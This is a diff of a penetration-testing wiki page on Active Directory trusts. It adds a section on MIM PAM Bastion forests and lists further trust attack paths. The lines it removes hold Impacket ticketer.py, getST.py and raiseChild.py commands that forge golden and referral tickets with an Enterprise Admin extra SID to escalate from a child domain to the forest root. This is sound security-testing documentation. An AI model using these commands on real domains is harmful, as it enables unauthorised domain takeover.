@@ -1,7 +1,6 @@
 ---
 title: "Trusts"
 ---
-
 <Callout type="warn">
 
 **This is a work-in-progress**. It's indicated with the emoji in the page name or in the category name
@@ -212,6 +211,20 @@ When doing NTLM authentications across trusts, the trusting domain's domain cont
 
 _Nota bene, wether it's Kerberos or NTLM, the ExtraSids are in the same data structure, it's just named differently for each protocol. And, the SID filtering function called by the trusting DC is the same, for both authentication protocols._
 
+#### MIM PAM & Bastion (Red Forests)
+
+Microsoft introduced MIM (Microsoft Identity Manager) Privileged Access Management (PAM) with Server 2016. Sometimes referred to as PIM, it brings:
+
+* a **Bastion forest** (a forest in ESAE, Enhanced Security Admin Environment, also called a Red Forest)
+* **Shadow Security Principals**, letting admins in the Bastion forest be mapped as Domain Admins of a production forest
+* **temporary group membership**, adding a user to a group with a time-to-live
+
+PAM manages an existing production forest from a Bastion forest holding a one-way PAM trust with it. Users in the Bastion forest are mapped to privileged groups such as Domain Admins or Enterprise Admins in the production forest **without modifying any group membership or ACL**, which removes administrative overhead and reduces lateral movement opportunities.
+
+<Callout type="info">
+This section is a light adaptation of [Nikhil Mittal's](https://www.labofapenetrationtester.com/2019/04/abusing-PAM.html) and [Daniel Ulrichs's](https://secureidentity.se/msds-shadowprincipal/) work.
+</Callout>
+
 ## Practice
 
 ### Enumeration
@@ -273,7 +286,7 @@ Get-NetForestDomain | Get-NetDomainTrust
 Invoke-MapDomainTrust
 
 #Get users with privileges in other domains inside the forest
-Get-DomainForeingUser
+Get-DomainForeignUser
 
 #Get groups with privileges in other domains inside the forest
 Get-DomainForeignGroupMember
@@ -290,57 +303,18 @@ Get-DomainForeignGroupMember
 </Tab>
 </Tabs>
 
-### Forging Tickets
+### Further attack surface
 
-When forging a[ referral ticket](/ad/movement/domain-trusts#referral-ticket), or a [golden ticket](/ad/movement/domain-trusts#golden-ticket), additional security identifiers (SIDs) can be added as "extra SID" and be considered as part of the user's [SID history](/ad/movement/domain-trusts#sid-history) when authenticating.
+Beyond the techniques above, the following are known trust attack paths that are
+not yet covered here. They are listed so the surface is visible even where the
+detail is missing:
 
-<Tabs items={['UNIX-like', 'Windows']}>
-<Tab value="UNIX-like">
-
-From UNIX-like systems, [Impacket](https://github.com/fortra/impacket) scripts (Python) can be used for that purpose.
-
-* ticketer.py to forge tickets
-* getST.py to request service tickets
-* lookupsid.py to retrieve the domains' SIDs
-
-If SID filtering is disabled, set the RID to 519 to act as Enterprise Admin.
-
-If SID filtering is partially enabled, set the RID >=1000.
-
-#### **Referral ticket**
-
-```bash
-# 1. forge the ticket
-ticketer.py -nthash "inter-realm key" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "<root_domain_SID>-<RID>" -spn "krbtgt/root_domain_fqdn" "someusername"
-
-# 2. use it to request a service ticket
-KRB5CCNAME="someusername.ccache" getST.py -k -no-pass -debug -spn "CIFS/domain_controller" "root_domain_fqdn/someusername@root_domain_fqdn"
-```
-```bash
-ticketer.py -nthash "child_domain_krbtgt_NT_hash" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "-" "someusername"
-```
-
-#### **Golden ticket**
-
-```bash
-# 1. forge the ticket
-ticketer.py -nthash "child_domain_krbtgt_NT_hash" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "<root_domain_SID>-<RID>" "someusername"
-```
-
-Impacket's [raiseChild.py](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py) script can also be used to conduct the golden ticket technique automatically when SID filtering is disabled (retrieving the SIDs, dumping the trusted domain's krbtgt, forging the ticket, dumping the forest root keys, etc.). It will forge a ticket with the Enterprise Admins extra SID.
-
-```bash
-raiseChild.py "child_domain"/"child_domain_admin":"$PASSWORD"
-```
-
-</Tab>
-
-<Tab value="Windows">
-
-
-
-</Tab>
-</Tabs>
+* **Keys container trust** and **DNS trust** abuse
+* **GPO on site** applied across a trust
+* **GoldenGMSA** across a forest boundary
+* **Schema change attack** from child to parent ([improsec](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent))
+* **DACL abuse**, **AD-CS abuse** and **group memberships** spanning a trust
+* **Unconstrained delegation** abuse across a trust
 
 ## Resources
 
